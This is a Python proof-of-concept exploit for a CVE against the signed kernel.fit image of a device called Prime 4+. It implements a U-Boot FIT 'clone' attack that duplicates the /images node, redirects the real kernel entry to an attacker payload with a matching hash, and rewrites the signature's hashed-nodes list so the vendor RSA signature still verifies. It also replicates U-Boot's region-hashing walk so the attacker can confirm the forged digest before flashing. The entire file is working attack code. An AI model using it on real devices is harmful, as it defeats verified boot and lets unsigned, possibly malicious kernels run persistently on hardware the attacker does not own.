#!/usr/bin/env python3
"""
CVE-2026-46728 — byte-exact image-clone attack on the REAL Prime 4+ kernel.fit.

Reimplements the upstream vboot 'clone' attack at the raw FDT structure
level (no value round-tripping), adapted for external-data FITs:

  1. duplicate the ENTIRE /images node as its own last child
     -> /images/images/{kernel,fdt-*}  (pristine byte copies)
  2. patch the REAL (first) /images/kernel in place:
     data-size / data-offset / hash-1 value -> attacker payload
     (same-width u32/u8[] edits: no reflow)
  3. replace signature-0 hashed-nodes stringlist to point at the clones

The vendor RSA 'value' property is never touched. No private key used.

Also includes a byte-level replica of U-Boot's fdt_find_regions() walk so the
hashed byte-stream can be diffed original-vs-attacked before flashing.
"""
import hashlib
import struct
import sys

BEGIN, END, PROP, NOP, FDT_END = 1, 2, 3, 4, 9

def parse_header(d):
    (magic, totalsize, off_struct, off_strings, off_rsv, version, lcp,
     bcp, sz_strings, sz_struct) = struct.unpack(">10I", d[:40])
    assert magic == 0xD00DFEED
    return dict(totalsize=totalsize, off_struct=off_struct,
                off_strings=off_strings, off_rsv=off_rsv,
                sz_strings=sz_strings, sz_struct=sz_struct)

def tokenize(struct_block):
    """Yield (tag, payload_dict) tokens; byte-exact re-serializable."""
    toks = []
    off = 0
    path = []
    while off < len(struct_block):
        tag = struct.unpack(">I", struct_block[off:off+4])[0]
        if tag == BEGIN:
            end = struct_block.index(b"\0", off+4)
            name = struct_block[off+4:end]
            noff = (end + 1 + 3) & ~3
            toks.append(("BEGIN", (name, struct_block[end+1:noff])))
            path.append(name)
            off = noff
        elif tag == END:
            toks.append(("END", None))
            if path: path.pop()
            off += 4
        elif tag == PROP:
            plen, nameoff = struct.unpack(">II", struct_block[off+4:off+12])
            data = struct_block[off+12:off+12+plen]
            noff = (off + 12 + plen + 3) & ~3
            toks.append(("PROP", (nameoff, plen, data, struct_block[off+12+plen:noff])))
            off = noff
        elif tag == NOP:
            toks.append(("NOP", None))
            off += 4
        elif tag == FDT_END:
            toks.append(("FDT_END", None))
            off += 4
        else:
            raise ValueError(f"bad tag {tag} at {off}")
    return toks

def serialize(toks):
    out = bytearray()
    for t, v in toks:
        if t == "BEGIN":
            name, pad = v
            out += struct.pack(">I", BEGIN) + name + b"\0" + pad
        elif t in ("END", "NOP"):
            out += struct.pack(">I", END if t == "END" else NOP)
        elif t == "PROP":
            nameoff, plen, data, pad = v
            out += struct.pack(">III", PROP, plen, nameoff) + data + pad
        elif t == "FDT_END":
            out += struct.pack(">I", FDT_END)
    return bytes(out)

def prop_name(strings, nameoff):
    e = strings.index(b"\0", nameoff)
    return strings[nameoff:e].decode()

def find_subtree(toks, target_path):
    """Return (start,end) token indices of the node at target_path."""
    path = []
    start = None
    depth_at_start = 0
    for i, (t, v) in enumerate(toks):
        if t == "BEGIN":
            path.append(v[0].decode())
            cur = "/" if len(path) == 1 and not path[0] else "/" + "/".join(p for p in path if p)
            if cur == target_path:
                start = i
                depth_at_start = len(path)
        elif t == "END":
            if start is not None and len(path) == depth_at_start:
                return (start, i)
            path.pop()
    raise KeyError(target_path)

def u32(x): return struct.pack(">I", x)

# ---------------- digest replica (fdt_find_regions) ----------------
def hashed_stream(toks, strings, inc_list, hashed_strings):
    want = 0
    stack = []
    out = bytearray()
    path = []
    inc = set(inc_list)
    for t, v in toks:
        if t == "BEGIN":
            name = v[0].decode()
            path.append(name)
            cur = "/" + "/".join(p for p in path if p)
            stack.append(want)
            if cur in inc:
                want = 2
            elif want:
                want -= 1
            if want:
                out += struct.pack(">I", BEGIN) + v[0] + b"\0" + v[1]
        elif t == "END":
            if want:
                out += struct.pack(">I", END)
            want = stack.pop() if stack else 0
            path.pop()
        elif t == "PROP":
            nameoff, plen, data, pad = v
            nm = prop_name(strings, nameoff)
            if want >= 2 and nm != "data":
                out += struct.pack(">III", PROP, plen, nameoff) + data + pad
        elif t == "NOP":
            if want >= 2:
                out += struct.pack(">I", NOP)
        elif t == "FDT_END":
            out += struct.pack(">I", FDT_END)
    out += strings[:hashed_strings[1]]
    return bytes(out)

# -------------------------------------------------------------------
def main():
    orig_path, out_path, payload_path, conf_name = sys.argv[1:5]
    conf = "/" + conf_name if conf_name.startswith("configurations") else "/configurations/" + conf_name
    payload = open(payload_path, "rb").read()
    payload_hash = hashlib.sha256(payload).digest()

    d = open(orig_path, "rb").read()
    H = parse_header(d)
    struct_blk = d[H["off_struct"]:H["off_struct"] + H["sz_struct"]]
    strings = d[H["off_strings"]:H["off_strings"] + H["sz_strings"]]
    rsv = d[H["off_rsv"]:H["off_struct"]]
    ext = d[H["totaisize"]:] if "totaisize" in H else d[H["totalsize"]:]
    toks = tokenize(struct_blk)

    # --- locate original /images node and its kernel/fdt children ---
    img_s, img_e = find_subtree(toks, "/images")
    # original signature info (before edits)
    sig_path = conf + "/signature-0"
    sig_s, sig_e = find_subtree(toks, sig_path)

    def get_prop(t_s, t_e, name):
        for i in range(t_s + 1, t_e):
            t, v = toks[i]
            if t == "PROP":
                nameoff, plen, data, pad = v
                if prop_name(strings, nameoff) == name:
                    return data
        raise KeyError(name)

    kern_s, kern_e = find_subtree(toks, "/images/kernel")
    fdt_name = get_prop(*find_subtree(toks, conf), "fdt").split(b"\0")[0].decode()
    fdt_s, fdt_e = find_subtree(toks, f"/images/{fdt_name}")
    hashed_nodes = get_prop(sig_s, sig_e, "hashed-nodes").split(b"\0")
    hashed_strings = struct.unpack(">II", get_prop(sig_s, sig_e, "hashed-strings"))
    fdt_orig_off = struct.unpack(">I", get_prop(fdt_s, fdt_e, "data-offset"))[0]
    fdt_sz = struct.unpack(">I", get_prop(fdt_s, fdt_e, "data-size"))[0]
    fdt_data = ext[fdt_orig_off:fdt_orig_off + fdt_sz]

    # baseline digest of ORIGINAL
    inc_orig = [x.decode() for x in hashed_nodes if x]
    base_stream = hashed_stream(toks, strings, inc_orig, hashed_strings)
    print(f"[baseline] hashed stream sha256 = {hashlib.sha256(base_stream).hexdigest()}")
    print(f"[baseline] stream len = {len(base_stream)}")

    # --- 0. rewrite hashed-nodes FIRST (on pristine toks) ---
    inc_new = ["/", conf,
               "/images/images/kernel", "/images/images/kernel/hash-1",
               f"/images/images/{fdt_name}", f"/images/images/{fdt_name}/hash-1"]
    new_hn = b"".join(x.encode() + b"\0" for x in inc_new)
    for i in range(sig_s + 1, sig_e):
        t, v = toks[i]
        if t == "PROP" and prop_name(strings, v[0]) == "hashed-nodes":
            toks[i] = ("PROP", (v[0], len(new_hn), new_hn, v[3][:3]))
            break
    else:
        raise KeyError("hashed-nodes not found")

    # --- 1. duplicate the /images subtree as its last child ---
    copy = toks[img_s:img_e + 1]
    # strip root BEGIN/END of the copy? No: the copy's BEGIN carries name
    # 'images' -> becomes child node 'images' of /images. Keep as-is, but we
    # must drop the copy's outermost BEGIN/END and re-add them one level down?
    # Actually inserting the whole node inside /images makes its outer BEGIN
    # an inner node named 'images' - exactly what we want. Insert before END.
    new_toks = toks[:img_e] + copy + toks[img_e:]

    # --- 2. patch FIRST /images/kernel: offsets shift by the insertion? ---
    # insertion is AFTER kernel (kernel is first child), so original indices
    # for kernel/fdt/sig still valid.
    def patch_prop(t_s, t_e, name, newdata):
        for i in range(t_s + 1, t_e):
            t, v = new_toks[i]
            if t == "PROP" and prop_name(strings, v[0]) == name:
                assert len(newdata) == v[1], f"{name}: len {v[1]} -> {len(newdata)}"
                new_toks[i] = ("PROP", (v[0], v[1], newdata, v[3]))
                return
        raise KeyError(name)

    # new external layout: [fdt_data][payload]
    def a4(x): return (x + 3) & ~3
    payload_off = a4(len(fdt_data))

    patch_prop(fdt_s, fdt_e, "data-offset", u32(0))
    patch_prop(kern_s, kern_e, "data-size", u32(len(payload)))
    patch_prop(kern_s, kern_e, "data-offset", u32(payload_off))
    hs, he = find_subtree(new_toks, "/images/kernel/hash-1")
    patch_prop(hs, he, "value", payload_hash)

    # --- verify digest replica BEFORE assembling ---
    attack_stream = hashed_stream(new_toks, strings, inc_new, hashed_strings)
    print(f"[attack ] hashed stream sha256 = {hashlib.sha256(attack_stream).hexdigest()}")
    print(f"[attack ] stream len = {len(attack_stream)}")
    if base_stream == attack_stream:
        print("[+] DIGEST STREAMS IDENTICAL - signature will verify")
    else:
        # show first divergence
        for i, (a, b) in enumerate(zip(base_stream, attack_stream)):
            if a != b:
                print(f"[-] diverge at byte {i}: {a:02x} vs {b:02x}")
                print(f"    base  [{max(0,i-16)}:{i+16}] {base_stream[max(0,i-16):i+16].hex()}")
                print(f"    attack[{max(0,i-16)}:{i+16}] {attack_stream[max(0,i-16):i+16].hex()}")
                break
        sys.exit("[-] streams differ - aborting")

    # --- assemble output file ---
    new_struct = serialize(new_toks)
    strings_off = H["off_struct"] + len(new_struct)
    totalsize = strings_off + len(strings)
    totalsize = (totalsize + 3) & ~3
    hdr = bytearray(d[:40])
    struct.pack_into(">I", hdr, 4, totalsize)
    struct.pack_into(">I", hdr, 8, H["off_struct"])
    struct.pack_into(">I", hdr, 12, strings_off)
    struct.pack_into(">I", hdr, 32, len(strings))
    struct.pack_into(">I", hdr, 36, len(new_struct))
    fdt_blob = (bytes(hdr) + rsv + new_struct + strings)
    fdt_blob += b"\0" * (totalsize - len(fdt_blob))

    ext2 = bytearray(fdt_data) + b"\0" * (payload_off - len(fdt_data))
    ext2 += payload
    ext2 += b"\0" * (a4(len(ext2)) - len(ext2))

    open(out_path, "wb").write(fdt_blob + bytes(ext2))
    print(f"[+] wrote {out_path}: fdt={len(fdt_blob)} ext={len(ext2)} total={len(fdt_blob)+len(ext2)}")
    print(f"[+] payload kernel at ext+0x{payload_off:x} size={len(payload)} sha256={payload_hash.hex()}")

if __name__ == "__main__":
    main()
